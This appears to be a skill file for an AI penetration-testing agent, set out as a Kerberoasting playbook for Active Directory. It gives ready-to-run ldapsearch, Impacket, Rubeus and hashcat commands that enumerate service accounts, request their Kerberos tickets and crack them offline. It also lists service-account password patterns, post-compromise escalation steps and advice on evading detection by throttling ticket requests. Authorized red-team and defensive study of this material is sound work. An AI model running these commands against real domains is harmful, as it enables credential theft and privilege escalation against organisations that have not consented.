---
name: kerberoasting
description: Request Kerberos TGS tickets for SPN-bound service accounts and crack offline with hashcat — classic AD priv-esc primitive.
metadata:
  subdomain: active-directory
  when_to_use: "kerberoasting spn service ticket hashcat"
  mitre_attack:
    - T1558.003
---

# Kerberoasting Playbook

## Prerequisite
Any valid domain user. No special privileges required.

## 1. Identify roastable accounts
In a hosted engagement, inspect the authorized collection through
`bloodhound_mcp_find_objects` and `bloodhound_mcp_object_profile`, or use a
bounded read-only `bloodhound_mcp_cypher_query` when the semantic tools do not
expose the SPN property. Confirm collection coverage first. In standalone OSS,
use the registered `bhce_cypher` tool against that instance.
Or LDAP-direct:
```bash
ldapsearch -x -H ldap://DC_IP -D 'USER@DOM' -w 'PASS' \
  -b 'DC=corp,DC=local' \
  '(&(samAccountType=805306368)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
  sAMAccountName servicePrincipalName > /tmp/spns.txt
```

## 2. Request TGS tickets
**Impacket** (most reliable):
```bash
GetUserSPNs.py DOM/USER:'PASS' -dc-ip DC_IP -request \
  -outputfile /tmp/kerb.hashes
```

**Rubeus** (from Windows beachhead):
```powershell
Rubeus.exe kerberoast /outfile:C:\Windows\Temp\k.txt /nowrap
```

Modern hashes are `$krb5tgs$23$*user$DOM$spn*$<ciphertext>` (RC4). If
forest is Win2012+, AES tickets may come back as `$krb5tgs$18$*…`.

## 3. Crack offline
```bash
# RC4 (mode 13100)
hashcat -m 13100 -a 0 /tmp/kerb.hashes /usr/share/wordlists/rockyou.txt \
        --rules-file /usr/share/hashcat/rules/best64.rule

# AES256 (mode 19700)
hashcat -m 19700 -a 0 /tmp/kerb.hashes wordlist.txt

# Targeted rules for service-account passwords (often pattern-based)
hashcat -m 13100 -a 6 /tmp/kerb.hashes wordlist.txt '?d?d?d?d' \
        --rules-file /usr/share/hashcat/rules/d3ad0ne.rule
```

**Service-account heuristics**: 60-70% of kerberoasted accounts use:
- ServiceName + season + year (e.g. `SQLSvc2024!`, `IISWinter25`)
- App name + 4-digit numbers
- Default install passwords (Veeam, SCCM, Splunk admins)
- Custom dict from OSINT (company name, products, projects)

## 4. Promote cracked credential
```
kg_add_node(kind="credential", label="USER:CRACKED_PASSWORD",
            props={"source":"kerberoast","crack_time":"<n>m","mode":"hashcat-m13100"})
kg_add_edge(src=<cred>, dst=<user>, kind="authenticates")
```

## 5. Post-crack actions
Whatever the service account can reach is now yours:
- Run BloodHound as the new cred → re-ingest
- Often these accounts have AdminTo on the box hosting the service
- Sometimes they're members of Tier-0 groups (yes, really)

## OPSEC notes
- Requesting TGS tickets is logged to **4769** events on the DC
- Detection: 4769 with `Ticket Encryption Type=0x17` (RC4) when the
  service supports AES is anomalous
- Rate limiting: don't request all SPNs at once on a monitored network;
  Impacket has no built-in throttle, write a wrapper
- Use `-no-preauth` to avoid lockout if doing manual TGS via kinit

## CVSS
- Roastable + crackable in scope timeframe: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = 9.0
- Roastable but uncrackable (long random pw): Informational
- AES-only + no offline crack feasible: Low

## Common services found
| SPN prefix | Likely account | Typical impact |
|---|---|---|
| `MSSQLSvc/` | SQL service account | Often local admin on DB host |
| `HTTP/sccm*` | SCCM service | Often Domain Admin (misconfig) |
| `MSOLAPSvc.3/` | SSAS | Local admin on analysis server |
| `kadmin/changepw` | KDC account | RARE — high value if hit |
| `exchangeMDB/` | Exchange recovery | Sometimes priv group |
